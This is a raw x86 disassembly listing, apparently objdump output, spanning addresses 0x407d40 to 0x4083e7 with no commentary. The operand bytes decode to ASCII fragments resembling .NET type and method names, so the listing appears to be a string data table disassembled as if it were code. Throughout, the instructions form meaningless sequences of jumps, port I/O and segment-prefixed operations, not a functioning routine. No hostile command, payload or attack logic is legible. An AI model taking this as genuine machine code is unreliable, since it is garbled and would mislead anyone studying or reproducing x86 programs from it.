  407d40:	gs jb  0x407db6
  407d43:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  407d4a:	add    BYTE PTR [edi+0x65],ah
  407d4d:	je     0x407dae
  407d4f:	push   eax
  407d50:	jb     0x407dc1
  407d52:	fs jne 0x407db8
  407d55:	je     0x407dad
  407d57:	gs jb  0x407dcd
  407d5a:	imul   ebp,DWORD PTR [edi+0x6e],0x6f464900
  407d61:	jb     0x407dd0
  407d63:	popa   
  407d64:	je     0x407db6
  407d66:	jb     0x407dd7
  407d68:	jbe    0x407dd3
  407d6a:	fs gs jb 0x407d6e
  407d6e:	inc    esi
  407d6f:	outs   dx,DWORD PTR ds:[esi]
  407d70:	jb     0x407ddf
  407d72:	popa   
  407d73:	je     0x407d75
  407d75:	addr16 gs je 0x407dd8
  407d79:	push   esp
  407d7a:	jb     0x407ddd
  407d7c:	arpl   WORD PTR [ebp+0x4c],sp
  407d7f:	outs   dx,DWORD PTR ds:[esi]
  407d80:	arpl   WORD PTR [ecx+0x74],sp
  407d83:	imul   ebp,DWORD PTR [edi+0x6e],0x6e6f4300
  407d8a:	imul   sp,WORD PTR [edi+0x46],0x6c69
  407d90:	gs dec eax
  407d92:	gs ins BYTE PTR es:[edi],dx
  407d94:	jo     0x407dfb
  407d96:	jb     0x407d98
  407d98:	dec    ecx
  407d99:	jae    0x407ddf
  407d9b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  407da2:	jns    0x407dfb
  407da4:	jb     0x407e0f
  407da6:	je     0x407e09
  407da8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  407dac:	dec    esp
  407dad:	outs   dx,DWORD PTR ds:[esi]
  407dae:	arpl   WORD PTR [ecx+0x6c],sp
  407db1:	inc    ecx
  407db2:	je     0x407e28
  407db4:	popa   
  407db5:	arpl   WORD PTR [eax+0x54],bp
  407db8:	popa   
  407db9:	jb     0x407e22
  407dbb:	gs je  0x407dbe
  407dbe:	jae    0x407e25
  407dc0:	je     0x407e21
  407dc2:	push   eax
  407dc3:	jb     0x407e34
  407dc5:	arpl   WORD PTR [ebp+0x73],sp
  407dc8:	jae    0x407e13
  407dca:	add    BYTE PTR fs:[edi+0x65],ah
  407dce:	je     0x407e2f
  407dd0:	push   eax
  407dd1:	jb     0x407e42
  407dd3:	arpl   WORD PTR [ebp+0x73],sp
  407dd6:	jae    0x407e26
  407dd8:	popa   
  407dd9:	ins    DWORD PTR es:[edi],dx
  407dda:	add    BYTE PTR gs:[ebx+0x65],dh
  407dde:	je     0x407e3f
  407de0:	push   esp
  407de1:	popa   
  407de2:	jb     0x407e4b
  407de4:	gs je  0x407e35
  407de7:	popa   
  407de8:	ins    DWORD PTR es:[edi],dx
  407de9:	add    BYTE PTR gs:[edi+0x65],ah
  407ded:	je     0x407e4e
  407def:	push   esp
  407df0:	popa   
  407df1:	jb     0x407e5a
  407df3:	gs je  0x407e44
  407df6:	popa   
  407df7:	ins    DWORD PTR es:[edi],dx
  407df8:	add    BYTE PTR gs:[edi+0x65],ah
  407dfc:	je     0x407e5d
  407dfe:	push   eax
  407dff:	jb     0x407e70
  407e01:	arpl   WORD PTR [ebp+0x73],sp
  407e04:	jae    0x407e4f
  407e06:	add    BYTE PTR fs:[ecx+0x6e],cl
  407e0a:	je     0x407e3f
  407e0c:	xor    al,BYTE PTR [eax]
  407e0e:	dec    esp
  407e0f:	outs   dx,DWORD PTR ds:[esi]
  407e10:	arpl   WORD PTR [ecx+0x6c],sp
  407e13:	push   ebx
  407e14:	jns    0x407e89
  407e16:	je     0x407e7d
  407e18:	ins    DWORD PTR es:[edi],dx
  407e19:	push   edi
  407e1a:	imul   esp,DWORD PTR [ebp+eiz*2+0x54],0x65677261
  407e22:	je     0x407e24
  407e24:	push   ebx
  407e25:	je     0x407e96
  407e27:	jo     0x407e6c
  407e29:	outs   dx,DWORD PTR ds:[esi]
  407e2a:	ins    BYTE PTR es:[edi],dx
  407e2b:	ins    BYTE PTR es:[edi],dx
  407e2c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407e31:	outs   dx,BYTE PTR ds:[esi]
  407e32:	push   ebx
  407e33:	gs jb  0x407eac
  407e36:	imul   esp,DWORD PTR [ebx+0x65],0x6c6f4300
  407e3d:	ins    BYTE PTR es:[edi],dx
  407e3e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407e43:	outs   dx,BYTE PTR ds:[esi]
  407e44:	push   ebx
  407e45:	je     0x407eb6
  407e47:	jo     0x407e9b
  407e49:	gs jae 0x407ec1
  407e4c:	ins    BYTE PTR es:[edi],dx
  407e4d:	je     0x407e4f
  407e4f:	push   ebx
  407e50:	je     0x407ec1
  407e52:	jo     0x407ea8
  407e54:	jb     0x407eb7
  407e56:	arpl   WORD PTR [ecx+0x6e],bp
  407e59:	add    BYTE PTR [bp+di+0x79],dl
  407e5d:	jae    0x407ed3
  407e5f:	gs ins DWORD PTR es:[edi],dx
  407e61:	cs push ebx
  407e63:	gs jb  0x407edc
  407e66:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  407e6d:	ins    BYTE PTR es:[edi],dx
  407e6e:	add    BYTE PTR [esi+0x61],al
  407e71:	jne    0x407edf
  407e73:	je     0x407eba
  407e75:	js     0x407eda
  407e77:	gs jo  0x407eee
  407e7a:	imul   ebp,DWORD PTR [edi+0x6e],0x43003160
  407e81:	outs   dx,DWORD PTR ds:[esi]
  407e82:	ins    BYTE PTR es:[edi],dx
  407e83:	ins    BYTE PTR es:[edi],dx
  407e84:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407e89:	outs   dx,BYTE PTR ds:[esi]
  407e8a:	inc    esi
  407e8b:	popa   
  407e8c:	jne    0x407efa
  407e8e:	je     0x407e90
  407e90:	addr16 gs je 0x407ef3
  407e94:	inc    esp
  407e95:	gs je  0x407ef9
  407e98:	imul   ebp,DWORD PTR [eax+eax*1+0x67],0x455f7465
  407ea0:	jb     0x407f14
  407ea2:	outs   dx,DWORD PTR ds:[esi]
  407ea3:	jb     0x407ef9
  407ea5:	jns    0x407f17
  407ea7:	add    BYTE PTR gs:[edi+0x65],ah
  407eab:	je     0x407f0c
  407ead:	inc    ebp
  407eae:	jb     0x407f22
  407eb0:	outs   dx,DWORD PTR ds:[esi]
  407eb1:	jb     0x407f00
  407eb3:	gs jae 0x407f29
  407eb6:	popa   
  407eb7:	add    BYTE PTR gs:[si+0x72],dl
  407ebc:	inc    ebp
  407ebd:	jb     0x407f31
  407ebf:	outs   dx,DWORD PTR ds:[esi]
  407ec0:	jb     0x407ec2
  407ec2:	inc    esi
  407ec3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x73697845
  407ecb:	je     0x407f40
  407ecd:	add    BYTE PTR [edi+ebp*2+0x63],cl
  407ed1:	popa   
  407ed2:	ins    BYTE PTR es:[edi],dx
  407ed3:	dec    esp
  407ed4:	popa   
  407ed5:	jne    0x407f45
  407ed7:	arpl   WORD PTR [eax+0x54],bp
  407eda:	popa   
  407edb:	jb     0x407f44
  407edd:	gs je  0x407ee0
  407ee0:	jae    0x407f47
  407ee2:	je     0x407f43
  407ee4:	dec    esp
  407ee5:	popa   
  407ee6:	jne    0x407f56
  407ee8:	arpl   WORD PTR [eax+0x50],bp
  407eeb:	jb     0x407f5c
  407eed:	addr16 jb 0x407f51
  407ef0:	ins    DWORD PTR es:[edi],dx
  407ef1:	add    BYTE PTR [ebx+0x65],dh
  407ef4:	je     0x407f55
  407ef6:	dec    esp
  407ef7:	popa   
  407ef8:	jne    0x407f68
  407efa:	arpl   WORD PTR [eax+0x50],bp
  407efd:	popa   
  407efe:	jb     0x407f61
  407f00:	ins    DWORD PTR es:[edi],dx
  407f01:	gs je  0x407f69
  407f04:	jb     0x407f06
  407f06:	push   eax
  407f07:	popa   
  407f08:	je     0x407f72
  407f0a:	add    BYTE PTR [edi+0x65],al
  407f0d:	je     0x407f55
  407f0f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  407f17:	imul   esi,DWORD PTR [eax+ebp*2+0x6f],0x78457475
  407f1f:	je     0x407f86
  407f21:	outs   dx,BYTE PTR ds:[esi]
  407f22:	jae    0x407f8d
  407f24:	outs   dx,DWORD PTR ds:[esi]
  407f25:	outs   dx,BYTE PTR ds:[esi]
  407f26:	add    BYTE PTR [edi+0x65],al
  407f29:	je     0x407f6e
  407f2b:	outs   dx,DWORD PTR ds:[esi]
  407f2c:	ins    BYTE PTR es:[edi],dx
  407f2d:	ins    BYTE PTR es:[edi],dx
  407f2e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407f33:	outs   dx,BYTE PTR ds:[esi]
  407f34:	push   ebx
  407f35:	je     0x407f98
  407f37:	je     0x407fae
  407f39:	jae    0x407f3b
  407f3b:	cmp    al,0x3e
  407f3d:	arpl   WORD PTR [edi+0x5f],bx
  407f40:	inc    esp
  407f41:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  407f48:	ins    BYTE PTR es:[edi],dx
  407f49:	popa   
  407f4a:	jae    0x407fbf
  407f4c:	xor    al,0x0
  407f4e:	je     0x407fb1
  407f50:	jb     0x407fb9
  407f52:	gs je  0x407fa5
  407f55:	imul   esp,DWORD PTR [eax+eax*1+0x54],0x65636172
  407f5d:	push   eax
  407f5e:	jb     0x407fcf
  407f60:	arpl   WORD PTR [ebp+0x73],sp
  407f63:	jae    0x407fb2
  407f65:	outs   dx,DWORD PTR ds:[esi]
  407f66:	fs gs ins BYTE PTR es:[edi],dx
  407f69:	add    BYTE PTR [eax*2+0x75636578],bh
  407f70:	je     0x407fd7
  407f72:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  407f76:	xor    DWORD PTR [eax],eax
  407f78:	dec    esp
  407f79:	outs   dx,DWORD PTR ds:[esi]
  407f7a:	arpl   WORD PTR [ecx+0x6c],sp
  407f7d:	inc    esp
  407f7e:	popa   
  407f7f:	je     0x407fe2
  407f81:	dec    ebp
  407f82:	popa   
  407f83:	outs   dx,BYTE PTR ds:[esi]
  407f84:	popa   
  407f85:	addr16 gs jb 0x407fdc
  407f89:	outs   dx,DWORD PTR ds:[esi]
  407f8a:	jne    0x407ffe
  407f8c:	arpl   WORD PTR [ebp+0x0],sp
  407f8f:	cmp    al,0x45
  407f91:	js     0x407ff8
  407f93:	arpl   WORD PTR [ebp+0x74],si
  407f96:	gs bound ebx,QWORD PTR ds:[edi+0x5f]
  407f9b:	xor    al,BYTE PTR [eax]
  407f9d:	jo     0x407f9f
  407f9f:	add    BYTE PTR fs:[esi+edi*1],bh
  407fa3:	arpl   WORD PTR [edi+0x5f],bx
  407fa6:	inc    esp
  407fa7:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  407fae:	ins    BYTE PTR es:[edi],dx
  407faf:	popa   
  407fb0:	jae    0x408025
  407fb2:	add    BYTE PTR ss:[ebx+0x53],al
  407fb6:	and    al,0x3c
  407fb8:	cmp    BYTE PTR ds:[edi+0x5f],bl
  407fbc:	ins    BYTE PTR es:[edi],dx
  407fbd:	outs   dx,DWORD PTR ds:[esi]
  407fbe:	arpl   WORD PTR [ecx+0x6c],sp
  407fc1:	jae    0x407ff8
  407fc3:	add    BYTE PTR [eax+0x72],dh
  407fc6:	outs   dx,DWORD PTR ds:[esi]
  407fc7:	arpl   WORD PTR [ecx+0x72],ax
  407fca:	add    BYTE PTR [bx+di+0x73],ch
  407fce:	push   eax
  407fcf:	imul   esp,DWORD PTR [ebx+edx*2+0x70],0x66696365
  407fd7:	imul   esp,DWORD PTR [ebp+0x64],0x78453c00
  407fde:	arpl   WORD PTR gs:[ebp+0x74],si
  407fe2:	gs bound ebx,QWORD PTR ds:[edi+0x5f]
  407fe7:	xor    BYTE PTR [eax],al
  407fe9:	addr16 gs je 0x40804c
  407fed:	push   eax
  407fee:	imul   esp,DWORD PTR [eax+eax*1+0x47],0x61567465
  407ff6:	ins    BYTE PTR es:[edi],dx
  407ff7:	jne    0x40805e
  407ff9:	dec    edi
  407ffa:	jb     0x408040
  407ffc:	gs popaw 
  407fff:	jne    0x40806d
  408001:	je     0x408003
  408003:	addr16 gs je 0x408066
  408007:	dec    eax
  408008:	popa   
  408009:	jae    0x408061
  40800b:	popa   
  40800c:	ins    BYTE PTR es:[edi],dx
  40800d:	jne    0x408074
  40800f:	add    BYTE PTR [edi+0x70],ch
  408012:	pop    edi
  408013:	inc    ebp
  408014:	jno    0x40808b
  408016:	popa   
  408017:	ins    BYTE PTR es:[edi],dx
  408018:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65736544
  408020:	jb     0x40808b
  408022:	popa   
  408023:	ins    BYTE PTR es:[edi],dx
  408024:	imul   edi,DWORD PTR [edx+0x65],0x61636f4c
  40802b:	ins    BYTE PTR es:[edi],dx
  40802c:	push   edx
  40802d:	gs jo  0x40809f
  408030:	jb     0x4080a6
  408032:	add    BYTE PTR [ecx+0x73],cl
  408035:	push   edx
  408036:	gs jo  0x4080a8
  408039:	jb     0x4080af
  40803b:	push   esi
  40803c:	gs jb  0x4080b2
  40803f:	imul   ebp,DWORD PTR [edi+0x6e],0x696c6156
  408046:	add    BYTE PTR fs:[edi+0x65],ah
  40804a:	je     0x4080ab
  40804c:	dec    edi
  40804d:	jo     0x4080b4
  40804f:	outs   dx,BYTE PTR ds:[esi]
  408050:	push   edx
  408051:	gs jo  0x4080c3
  408054:	jb     0x4080ca
  408056:	inc    esi
  408057:	popa   
  408058:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x696c6176
  408060:	fs push esi
  408062:	gs jb  0x4080d8
  408065:	imul   ebp,DWORD PTR [edi+0x6e],0x73614800
  40806c:	push   0x60746553
  408071:	xor    DWORD PTR [eax],eax
  408073:	addr16 gs je 0x4080d6
  408077:	push   esp
  408078:	jb     0x4080db
  40807a:	arpl   WORD PTR [ebp+0x50],sp
  40807d:	jb     0x4080ee
  40807f:	arpl   WORD PTR [ebp+0x73],sp
  408082:	jae    0x4080e9
  408084:	jae    0x408086
  408086:	addr16 gs je 0x4080e9
  40808a:	inc    ebx
  40808b:	outs   dx,DWORD PTR ds:[esi]
  40808c:	jne    0x4080fc
  40808e:	je     0x408090
  408090:	inc    esi
  408091:	jne    0x408101
  408093:	arpl   WORD PTR [eax+0x32],sp
  408096:	add    BYTE PTR [edi+0x68],dl
  408099:	gs jb  0x408101
  40809c:	add    BYTE PTR [ebx+0x6f],al
  40809f:	jne    0x40810f
  4080a1:	je     0x4080a3
  4080a3:	inc    ebp
  4080a4:	ins    BYTE PTR es:[edi],dx
  4080a5:	gs ins DWORD PTR es:[edi],dx
  4080a7:	outs   dx,BYTE PTR gs:[esi]
  4080a9:	je     0x4080ec
  4080ab:	je     0x4080ad
  4080ad:	inc    edi
  4080ae:	gs je  0x4080f5
  4080b1:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4080b8:	jns    0x408108
  4080ba:	popa   
  4080bb:	ins    DWORD PTR es:[edi],dx
  4080bc:	add    BYTE PTR gs:[ebx+0x65],dh
  4080c0:	je     0x408121
  4080c2:	push   esp
  4080c3:	jb     0x408126
  4080c5:	arpl   WORD PTR [ebp+0x4c],sp
  4080c8:	outs   dx,DWORD PTR ds:[esi]
  4080c9:	arpl   WORD PTR [ecx+0x74],sp
  4080cc:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4080d3:	pop    edi
  4080d4:	inc    esp
  4080d5:	popa   
  4080d6:	je     0x408139
  4080d8:	dec    ebp
  4080d9:	popa   
  4080da:	outs   dx,BYTE PTR ds:[esi]
  4080db:	popa   
  4080dc:	addr16 gs jb 0x408133
  4080e0:	outs   dx,DWORD PTR ds:[esi]
  4080e1:	jne    0x408155
  4080e3:	arpl   WORD PTR [ebp+0x73],sp
  4080e6:	add    BYTE PTR [eax+0x72],dl
  4080e9:	gs imul esp,DWORD PTR fs:[ebx+0x61],0x31606574
  4080f2:	add    BYTE PTR [edx+0x65],dl
  4080f5:	ins    DWORD PTR es:[edi],dx
  4080f6:	outs   dx,DWORD PTR ds:[esi]
  4080f7:	jbe    0x40815e
  4080f9:	inc    ecx
  4080fa:	ins    BYTE PTR es:[edi],dx
  4080fb:	ins    BYTE PTR es:[edi],dx
  4080fc:	add    BYTE PTR [edi+0x65],ah
  4080ff:	je     0x408160
  408101:	dec    ecx
  408102:	outs   dx,BYTE PTR ds:[esi]
  408103:	jbe    0x408166
  408105:	jb     0x408170
  408107:	popa   
  408108:	outs   dx,BYTE PTR ds:[esi]
  408109:	je     0x40814e
  40810b:	jne    0x408179
  40810d:	je     0x408184
  40810f:	jb     0x408176
  408111:	add    BYTE PTR [edi+0x65],ah
  408114:	je     0x408175
  408116:	inc    esi
  408117:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x50656d61
  40811f:	jb     0x408186
  408121:	imul   di,WORD PTR [eax+0x0],0x4955
  408127:	outs   dx,BYTE PTR ds:[esi]
  408128:	je     0x40815d
  40812a:	xor    al,BYTE PTR [eax]
  40812c:	inc    ebx
  40812d:	outs   dx,DWORD PTR ds:[esi]
  40812e:	ins    DWORD PTR es:[edi],dx
  40812f:	bound  ebp,QWORD PTR [ecx+0x6e]
  408132:	add    BYTE PTR gs:[ebx+0x6f],al
  408136:	ins    BYTE PTR es:[edi],dx
  408137:	ins    BYTE PTR es:[edi],dx
  408138:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40813d:	outs   dx,BYTE PTR ds:[esi]
  40813e:	push   ebx
  40813f:	gs jb  0x4081b8
  408142:	imul   esp,DWORD PTR [ebx+0x65],0x6e65674e
  408149:	push   eax
  40814a:	bound  eax,QWORD PTR fs:[ecx+0x64]
  40814e:	popa   
  40814f:	jo     0x4081c5
  408151:	gs jb  0x408154
  408154:	dec    ecx
  408155:	inc    ebx
  408156:	outs   dx,DWORD PTR ds:[esi]
  408157:	ins    BYTE PTR es:[edi],dx
  408158:	ins    BYTE PTR es:[edi],dx
  408159:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40815e:	outs   dx,BYTE PTR ds:[esi]
  40815f:	push   ebx
  408160:	gs jb  0x4081d9
  408163:	imul   esp,DWORD PTR [ebx+0x65],0x63694d00
  40816a:	jb     0x4081db
  40816c:	jae    0x4081dd
  40816e:	data16 je 0x40819f
  408171:	inc    ebx
  408172:	outs   dx,DWORD PTR ds:[esi]
  408173:	outs   dx,BYTE PTR ds:[esi]
  408174:	arpl   WORD PTR [ebp+0x72],si
  408177:	jb     0x4081de
  408179:	outs   dx,BYTE PTR ds:[esi]
  40817a:	arpl   WORD PTR [ecx+0x56],di
  40817d:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  408184:	gs jb  0x4081b5
  408187:	push   eax
  408188:	jb     0x4081f9
  40818a:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x67
  408191:	dec    esp
  408192:	outs   dx,DWORD PTR ds:[esi]
  408193:	arpl   WORD PTR [ecx+0x6c],sp
  408196:	push   eax
  408197:	jb     0x408208
  408199:	imul   bp,WORD PTR [ebp+eiz*2+0x72],0x4900
  4081a0:	dec    esp
  4081a1:	imul   esi,DWORD PTR [ebx+0x74],0x49003160
  4081a8:	push   ebx
  4081a9:	jno    0x408218
  4081ab:	push   esp
  4081ac:	jb     0x40820f
  4081ae:	arpl   WORD PTR [ebp+0x44],sp
  4081b1:	popa   
  4081b2:	je     0x408215
  4081b4:	inc    ebx
  4081b5:	outs   dx,DWORD PTR ds:[esi]
  4081b6:	ins    BYTE PTR es:[edi],dx
  4081b7:	ins    BYTE PTR es:[edi],dx
  4081b8:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4081bd:	add    BYTE PTR [ecx+0x4e],cl
  4081c0:	outs   dx,BYTE PTR gs:[si]
  4081c3:	push   eax
  4081c4:	bound  edx,QWORD PTR fs:[edx+0x65]
  4081c8:	jno    0x40823f
  4081ca:	gs jae 0x408241
  4081cd:	gs jb  0x4081d0
  4081d0:	push   ebx
  4081d1:	jns    0x408246
  4081d3:	je     0x40823a
  4081d5:	ins    DWORD PTR es:[edi],dx
  4081d6:	cs push esp
  4081d8:	push   0x64616572
  4081dd:	imul   ebp,DWORD PTR [esi+0x67],0x6e614300
  4081e4:	arpl   WORD PTR [ebp+0x6c],sp
  4081e7:	ins    BYTE PTR es:[edi],dx
  4081e8:	popa   
  4081e9:	je     0x408254
  4081eb:	outs   dx,DWORD PTR ds:[esi]
  4081ec:	outs   dx,BYTE PTR ds:[esi]
  4081ed:	push   esp
  4081ee:	outs   dx,DWORD PTR ds:[esi]
  4081ef:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4081f3:	addr16 gs je 0x408256
  4081f7:	dec    esi
  4081f8:	outs   dx,DWORD PTR ds:[esi]
  4081f9:	outs   dx,BYTE PTR ds:[esi]
  4081fa:	add    BYTE PTR gs:[eax+0x72],dl
  4081fe:	outs   dx,DWORD PTR ds:[esi]
  4081ff:	imul   bp,WORD PTR [ebp+eiz*2+0x0],0x7445
  408206:	ja     0x40825c
  408208:	jb     0x40826b
  40820a:	arpl   WORD PTR [ebp+0x53],sp
  40820d:	outs   dx,DWORD PTR ds:[esi]
  40820e:	jne    0x408282
  408210:	arpl   WORD PTR [ebp+0x0],sp
  408213:	inc    ecx
  408214:	fs add BYTE PTR fs:[edi+0x65],ah
  408219:	je     0x40827a
  40821b:	push   edx
  40821c:	gs jo  0x40828e
  40821f:	jb     0x408295
  408221:	push   eax
  408222:	popa   
  408223:	je     0x40828d
  408225:	add    BYTE PTR [ebx+0x65],dl
  408228:	jb     0x408293
  40822a:	popa   
  40822b:	ins    BYTE PTR es:[edi],dx
  40822c:	imul   edi,DWORD PTR [edx+0x65],0x74656700
  408233:	pop    edi
  408234:	inc    esp
  408235:	gs ins BYTE PTR es:[edi],dx
  408237:	gs je  0x40829f
  40823a:	inc    ebp
  40823b:	je     0x4082a9
  40823d:	jae    0x408280
  40823f:	data16 je 0x4082a7
  408242:	jb     0x408285
  408244:	outs   dx,BYTE PTR ds:[esi]
  408245:	popa   
  408246:	ins    BYTE PTR es:[edi],dx
  408247:	jns    0x4082bc
  408249:	imul   esi,DWORD PTR [ebx+0x0],0x7465533c
  408250:	push   esp
  408251:	jb     0x4082b4
  408253:	arpl   WORD PTR [ebp+0x50],sp
  408256:	jb     0x4082c7
  408258:	arpl   WORD PTR [ebp+0x73],sp
  40825b:	jae    0x4082c2
  40825d:	jae    0x40829d
  40825f:	bound  ebx,QWORD PTR [edi+0x5f]
  408262:	cmp    BYTE PTR [eax],al
  408264:	jo     0x4082d8
  408266:	outs   dx,DWORD PTR ds:[esi]
  408267:	arpl   WORD PTR [ebp+0x73],sp
  40826a:	jae    0x4082b5
  40826c:	outs   dx,BYTE PTR ds:[esi]
  40826d:	outs   dx,WORD PTR ds:[esi]
  40826f:	add    BYTE PTR [ebx+0x53],al
  408272:	and    al,0x3c
  408274:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  408278:	inc    ebx
  408279:	popa   
  40827a:	arpl   WORD PTR [eax+0x65],bp
  40827d:	fs inc ecx
  40827f:	outs   dx,BYTE PTR ds:[esi]
  408280:	outs   dx,DWORD PTR ds:[esi]
  408281:	outs   dx,BYTE PTR ds:[esi]
  408282:	jns    0x4082f1
  408284:	outs   dx,DWORD PTR ds:[esi]
  408285:	jne    0x4082fa
  408287:	dec    ebp
  408288:	gs je  0x4082f3
  40828b:	outs   dx,DWORD PTR ds:[esi]
  40828c:	fs inc esp
  40828e:	gs ins BYTE PTR es:[edi],dx
  408290:	gs addr16 popa 
  408293:	je     0x4082fa
  408295:	popa   
  408296:	add    BYTE PTR [ebx+0x6f],al
  408299:	ins    DWORD PTR es:[edi],dx
  40829a:	jo     0x408305
  40829c:	ins    BYTE PTR es:[edi],dx
  40829d:	gs jb  0x4082e7
  4082a0:	outs   dx,BYTE PTR gs:[esi]
  4082a2:	gs jb  0x408306
  4082a5:	je     0x40830c
  4082a7:	fs inc ecx
  4082a9:	je     0x40831f
  4082ab:	jb     0x408316
  4082ad:	bound  esi,QWORD PTR [ebp+0x74]
  4082b0:	add    BYTE PTR gs:[ebx+edx*2],bh
  4082b4:	gs je  0x40830b
  4082b7:	jb     0x40831a
  4082b9:	arpl   WORD PTR [ebp+0x50],sp
  4082bc:	jb     0x40832d
  4082be:	arpl   WORD PTR [ebp+0x73],sp
  4082c1:	jae    0x408328
  4082c3:	jae    0x408303
  4082c5:	bound  ebx,QWORD PTR [edi+0x5f]
  4082c8:	cmp    DWORD PTR [eax],eax
  4082ca:	inc    ebx
  4082cb:	push   ebx
  4082cc:	and    al,0x3c
  4082ce:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  4082d2:	inc    ebx
  4082d3:	popa   
  4082d4:	arpl   WORD PTR [eax+0x65],bp
  4082d7:	fs inc ecx
  4082d9:	outs   dx,BYTE PTR ds:[esi]
  4082da:	outs   dx,DWORD PTR ds:[esi]
  4082db:	outs   dx,BYTE PTR ds:[esi]
  4082dc:	jns    0x40834b
  4082de:	outs   dx,DWORD PTR ds:[esi]
  4082df:	jne    0x408354
  4082e1:	dec    ebp
  4082e2:	gs je  0x40834d
  4082e5:	outs   dx,DWORD PTR ds:[esi]
  4082e6:	fs inc esp
  4082e8:	gs ins BYTE PTR es:[edi],dx
  4082ea:	gs addr16 popa 
  4082ed:	je     0x408354
  4082ef:	bound  eax,QWORD PTR [eax]
  4082f1:	push   esp
  4082f2:	jb     0x408355
  4082f4:	arpl   WORD PTR [ebp+0x50],sp
  4082f7:	jb     0x408368
  4082f9:	arpl   WORD PTR [ebp+0x73],sp
  4082fc:	jae    0x40836d
  4082fe:	jb     0x408300
  408300:	inc    ecx
  408301:	fs fs push eax
  408304:	popa   
  408305:	jb     0x40837a
  408307:	gs jb  0x40830a
  40830a:	push   esp
  40830b:	jb     0x40836e
  40830d:	arpl   WORD PTR [ebp+0x50],sp
  408310:	jb     0x408381
  408312:	arpl   WORD PTR [ebp+0x73],sp
  408315:	jae    0x408360
  408317:	outs   dx,BYTE PTR ds:[esi]
  408318:	outs   dx,WORD PTR ds:[esi]
  40831a:	push   eax
  40831b:	popa   
  40831c:	jb     0x408391
  40831e:	gs jb  0x408321
  408321:	inc    ebp
  408322:	outs   dx,BYTE PTR ds:[esi]
  408323:	jne    0x408392
  408325:	gs jb  0x408389
  408328:	je     0x408399
  40832a:	jb     0x40832c
  40832c:	inc    edi
  40832d:	gs je  0x408375
  408330:	outs   dx,BYTE PTR ds:[esi]
  408331:	jne    0x4083a0
  408333:	gs jb  0x408397
  408336:	je     0x4083a7
  408338:	jb     0x40833a
  40833a:	addr16 gs je 0x40839d
  40833e:	inc    ebx
  40833f:	jne    0x4083b3
  408341:	jb     0x4083a8
  408343:	outs   dx,BYTE PTR ds:[esi]
  408344:	je     0x408346
  408346:	inc    ecx
  408347:	fs fs push esp
  40834a:	jb     0x4083ad
  40834c:	arpl   WORD PTR [ebp+0x53],sp
  40834f:	outs   dx,DWORD PTR ds:[esi]
  408350:	jne    0x4083c4
  408352:	arpl   WORD PTR [ebp+0x0],sp
  408355:	dec    ebp
  408356:	outs   dx,DWORD PTR ds:[esi]
  408357:	jbe    0x4083be
  408359:	dec    esi
  40835a:	gs js  0x4083d1
  40835d:	add    BYTE PTR [ecx+0x44],cl
  408360:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  408367:	ins    BYTE PTR es:[edi],dx
  408368:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  40836d:	jo     0x4083de
  40836f:	jae    0x4083d6
  408371:	add    BYTE PTR [ebx+0x79],dl
  408374:	jae    0x4083ea
  408376:	gs ins DWORD PTR es:[edi],dx
  408378:	cs push esp
  40837a:	push   0x64616572
  40837f:	imul   ebp,DWORD PTR [esi+0x67],0x7361542e
  408386:	imul   esi,DWORD PTR [ebx+0x0],0x54
  40838a:	popa   
  40838b:	jae    0x4083f8
  40838d:	pusha  
  40838e:	xor    DWORD PTR [eax],eax
  408390:	push   eax
  408391:	popa   
  408392:	jb     0x408407
  408394:	gs push edx
  408396:	gs jae 0x40840e
  408399:	ins    BYTE PTR es:[edi],dx
  40839a:	je     0x40839c
  40839c:	push   eax
  40839d:	popa   
  40839e:	jb     0x408413
  4083a0:	gs push eax
  4083a2:	jb     0x408413
  4083a4:	addr16 jb 0x40840c
  4083a7:	jae    0x40841c
  4083a9:	push   eax
  4083aa:	popa   
  4083ab:	jb     0x40840e
  4083ad:	ins    DWORD PTR es:[edi],dx
  4083ae:	gs je  0x408416
  4083b1:	jb     0x4083b3
  4083b3:	push   eax
  4083b4:	popa   
  4083b5:	jb     0x40842a
  4083b7:	gs inc ecx
  4083b9:	jae    0x408434
  4083bb:	outs   dx,BYTE PTR ds:[esi]
  4083bc:	arpl   WORD PTR [eax],ax
  4083be:	push   esp
  4083bf:	popa   
  4083c0:	jae    0x40842d
  4083c2:	add    BYTE PTR [edi+0x61],dl
  4083c5:	imul   esi,DWORD PTR [eax+eax*1+0x54],0x64656d69
  4083cd:	dec    ecx
  4083ce:	fs dec eax
  4083d0:	popa   
  4083d1:	outs   dx,BYTE PTR ds:[esi]
  4083d2:	fs ins BYTE PTR es:[edi],dx
  4083d4:	gs jb  0x40841a
  4083d7:	outs   dx,DWORD PTR ds:[esi]
  4083d8:	ins    BYTE PTR es:[edi],dx
  4083d9:	ins    BYTE PTR es:[edi],dx
  4083da:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4083df:	outs   dx,BYTE PTR ds:[esi]
  4083e0:	pusha  
  4083e1:	xor    al,BYTE PTR [eax]
  4083e3:	addr16 gs je 0x408446
  4083e7:	push   esp
